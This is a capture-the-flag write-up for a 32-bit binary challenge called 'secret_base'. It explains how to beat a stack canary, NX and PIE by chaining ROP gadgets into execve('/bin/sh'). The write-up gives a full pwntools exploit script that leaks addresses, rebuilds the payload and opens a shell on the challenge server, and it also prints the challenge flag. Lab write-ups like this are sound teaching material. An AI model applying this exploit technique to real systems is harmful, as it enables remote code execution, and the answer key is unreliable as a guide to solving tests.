# secret_base

## Authors

- @jjamme

## Category

- Binary Exploit

## Description

We aren't using gets this time so good luck trying to execute a buffer overflow

`nc pwn.ctf.unswsecurity.com 5003`

## Difficulty

- Medium

## Points

160

## Files

- `secret_base`: vulnerable binary

## Solution

<details>
<summary>Spoiler</summary>

### Idea

Use ROP (return oriented programming) to create a chain of instructions which will run the instruciton `int 0x80` with `eax` as 11 to run the system call `execve`.

With the `ebx` register as `/bin/sh` but also ecx and edx as both 0, we will essentially run `execve("/bin/sh")`.

### Walkthrough

1. In `new_office`, we used a NOP sled to execute shellcode by returning to the address of the buffer with our shellcode. That worked because the binary did not have `NX` (non-executable stack) enabled.
   - With this flag, the binary will know not to execute any instructions if the `eip` is in the stack.
2. A stack canary and PIE will also have to be defeated in order to compelete this task
   - A canary is a 4 byte (in 32-bit systems) randomly generated sequence with the last byte being a null terminator. This prevents buffer overflow attack from happening by checking if the canary has been overwritten
   - PIE (position independent code) shuffles memory segments of the binary in order to randomise their locations in memory.
3. So get around this protection, we instead return into a group of instructions which are already in the binary. These group of instructions will have a `ret` instruction right after those group of instructions, these are called gadgets (i.e. `mov eax, ebx; ret;` or `inc eax, 1; ret;`).
4. We input `/bin/sh\x00` in the user input because in GDB we can see that after the `vuln` function returns, eax holds the user's input. We can then attach the right amount of bytes to reach the canary, and then we attach our ROP chain.
5. Using a tool like `ROPGadget` or `ropper` will allow you to search for certain gadgets which will help you create the ROP chain to syscall for `execve("/bin/sh")`
   - After we finish the `vuln` function, "/bin/sh" will be in eax so we will require a move to move the registers from one to the other.

```py
payload = b"/bin/sh\x00" + b"A" * 16 + canary
payload += b"AAAA"*3
payload += pack(base_addr + 0x14d7) # mov ebx, eax; ret;
```

- We next move 0xffd3 into eax and increment it until it is 0 to move into the other registers (ecx, edx).

```py
payload += pack(base_addr + 0x1347) # mov eax, 0xffd3; ret;
payload += pack(base_addr + 0x1335) * 45 # inc eax; ret;
payload += pack(base_addr + 0x12fa) # mov ebp, eax; ret;
payload += pack(base_addr + 0x130d) # mov ecx, ebp; mov edx, ebp; ret;
```

- Increment eax 11 more times to have eax equalling to 11 so that it system calls `execve`.

```py
payload += pack(base_addr + 0x1335) * 11 # inc eax; ret;
payload += pack(base_addr + 0x1322) # int 0x80;
```

Final script:

```py
from pwn import *

#context.log_level = "debug"
remote_conn = True

IP = "pwn.ctf.unswsecurity.com"
PORT = "5003"
FILENAME = "path/to/file"

#libc = ELF("")
#ld = ELF("")

if remote_conn:
    p = remote(IP, PORT)
    elf = ELF(FILENAME)
else:
    #p = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
    p = process(FILENAME)
    elf = p.elf

p.recvuntil("isn't at: ")
leak = int(p.recvline()[:-1], 16)
log.info(hex(leak))

p.recvuntil("password is: ")
canary = p.recvline()[:-1]
log.info("canary: " + hex(unpack(canary)))

base_addr = leak - elf.sym["vuln"]
log.info("base: " + hex(base_addr))

payload = b"/bin/sh\x00" + b"A" * 16 + canary
payload += b"AAAA"*3
payload += pack(base_addr + 0x14d7) # mov ebx, eax; ret;
payload += pack(base_addr + 0x1347) # mov eax, 0xffd3; ret;
payload += pack(base_addr + 0x1335) * 45 # inc eax; ret;
payload += pack(base_addr + 0x12fa) # mov ebp, eax; ret;
payload += pack(base_addr + 0x130d) # mov ecx, ebp; mov edx, ebp; ret;
payload += pack(base_addr + 0x1335) * 11 # inc eax; ret;
payload += pack(base_addr + 0x1322) # int 0x80;
p.sendline(payload)

p.interactive()
```

### Flag

`SKYLIGHT{3x3CuTe_0ff1cE_5TACK}`

</details>
